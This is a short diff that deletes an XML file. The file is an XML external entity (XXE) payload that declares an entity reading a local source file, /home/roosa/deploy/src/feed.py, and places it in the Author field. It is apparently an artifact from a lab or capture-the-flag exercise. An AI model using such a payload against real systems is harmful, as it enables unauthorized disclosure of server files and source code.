@@ -1,7 +1,0 @@
-<?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///home/roosa/deploy/src/feed.py'>]>
-<root> 
-    <Author>&test;</Author>
-    <Subject>Subject</Subject>
-    <Content>Content</Content>
-</root>
